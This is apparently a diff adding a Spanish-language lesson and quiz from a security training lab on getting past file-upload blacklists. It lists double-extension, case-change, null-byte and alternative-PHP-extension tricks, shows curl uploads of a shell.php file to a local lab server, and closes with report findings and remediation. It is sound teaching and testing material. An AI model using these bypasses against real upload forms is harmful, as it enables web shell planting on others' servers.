@@ -1,0 +1,75 @@
+---
+index: 2
+title: "Bypass de la validación de subida"
+questions:
+  - id: file-upload-t02-q01
+    prompt: "¿Qué técnica añade una extensión 'segura' al final para pasar una blacklist? (ej: shell.php.txt)"
+    hint: "Double extension."
+    kind: text
+  - id: file-upload-t02-q02
+    prompt: "¿Qué valida la app del lab: la extensión del archivo o el content-type?"
+    hint: "Revisa el código conceptual del lab: solo mira la extensión."
+    kind: choice
+    options:
+      - id: a
+        label: "Content-type del HTTP header"
+      - id: b
+        label: "Solo la extensión del nombre de archivo (por eso es bypasseable)"
+      - id: c
+        label: "El contenido binario del archivo"
+      - id: d
+        label: "Nada: acepta todo"
+  - id: file-upload-t02-q03
+    prompt: "¿Qué archivo del lab tiene la flag de nivel 2?"
+    hint: "Está en /files — mira la lista de nuevo."
+    kind: flag
+---
+
+## La blacklist que se rompe
+
+El lab bloquea: `.php`, `.exe`, `.sh`, `.bat`, `.cmd`, `.ps1`.
+
+Prueba estas técnicas de bypass:
+
+```bash
+# 1. Double extension (el servidor guarda .php.txt):
+# Cambia shell.php → shell.php.txt
+# El filtro ve .txt (permitido), pero si el server ejecuta .php.txt...
+
+# 2. Case change:
+# shell.php → shell.PHP o shell.Php (algunos filtros son case-sensitive)
+
+# 3. Null byte (en lenguajes que lo procesan):
+# shell.php%00.txt (el %00 corta la extensión en algunos parsers)
+
+# 4. Sin extensión conocida:
+# shell.php5, shell.phtml, shell.php7 (extensiones PHP alternativas)
+```
+
+## Sube un archivo real
+
+Usa curl para subir:
+
+```bash
+# Subir un archivo de texto normal (aceptado):
+curl -F "file=@test.txt" http://127.0.0.1:18087/upload
+
+# Intentar subir shell.php (bloqueado):
+curl -F "file=@shell.php" http://127.0.0.1:18087/upload
+# → Error: extension .php is not allowed
+
+# Bypass con double extension:
+cp shell.php shell.php.txt
+curl -F "file=@shell.php.txt" http://127.0.0.1:18087/upload
+# → Uploaded! (la validación solo mira la última extensión)
+```
+
+## Lo que el informe debe decir
+
+1. **Directory listing activo**: cualquier usuario ve todos los archivos
+2. **Blacklist insuficiente**: se bypassea con double extension
+3. **Sin validación de content-type**: el archivo se guarda sin comprobar qué es
+4. **Sin límite de tamaño**: DoS potencial
+
+**Remediación**: allowlist de extensiones, renombrar archivos del servidor,
+guardar fuera del webroot, servir con Content-Type correcto.
